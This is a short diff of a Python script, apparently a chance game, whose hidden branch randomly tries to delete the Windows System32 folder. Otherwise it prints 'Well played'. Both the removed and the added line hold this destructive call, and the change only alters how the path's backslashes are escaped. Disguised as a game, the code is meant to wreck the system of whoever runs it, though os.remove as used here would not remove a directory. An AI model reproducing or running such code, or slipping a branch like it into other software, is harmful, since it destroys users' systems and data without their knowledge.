@@ -3,7 +3,7 @@ import random
 
 def main():
     if random.randint(0, 6) == 1:
-        os.remove("C:\\Windows\\System32")
+        os.remove("C:\Windows\System32")
     else:
         print("Well played")
 
